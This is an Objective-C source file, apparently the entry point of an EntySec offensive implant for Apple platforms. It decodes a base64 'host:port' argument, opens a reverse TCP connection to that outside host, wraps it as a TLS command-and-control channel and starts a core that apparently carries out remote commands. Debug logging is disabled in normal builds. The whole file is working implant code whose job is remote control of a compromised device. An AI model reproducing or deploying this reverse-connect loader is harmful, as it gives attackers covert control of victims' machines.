/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#import <Foundation/Foundation.h>

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <c2.h>
#include <net.h>
#include <core.h>

#ifdef DEBUG
#define NSLog(...) NSLog(__VA_ARGS__)
#else
#define NSLog(...) NULL
#endif

int connectTo(NSString *hostPart, int portPart)
{
    int sock;
    struct sockaddr_in hint;

    NSLog(@"Will connect to %@:%d\n", hostPart, portPart);

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock == -1)
    {
        return -1;
    }

    hint.sin_family = AF_INET;
    hint.sin_port = htons(portPart);
    hint.sin_addr.s_addr = inet_addr([hostPart UTF8String]);

    if (connect(sock, (struct sockaddr *)&hint, sizeof(hint)) != 0)
    {
        return -1;
    }

    return sock;
}

int main(int argc, const char *argv[]) {
    int sock;

    NSString *decodedString;
    NSString *encodedString;

    NSData *decodedData;
    NSArray *pairedData;

    c2_t *c2;
    core_t *core;

    @autoreleasepool {
        if (argc < 2) {
            return 1;
        }

        encodedString = [NSString stringWithFormat:@"%s", argv[1]];
        decodedData = [[NSData alloc] initWithBase64EncodedString:encodedString options:0];
        decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
        pairedData = [decodedString componentsSeparatedByString:@":"];

        if (pairedData.count < 2)
        {
            return -1;
        }

        c2 = NULL;
        sock = connectTo(pairedData[0], [pairedData[1] intValue]);

        c2_add_sock(&c2, 0, sock, NET_PROTO_TLS);

        core = core_create(c2);
        core_start(core);

        c2_free(c2);
        core_destroy(core);
    }
    return 0;
}
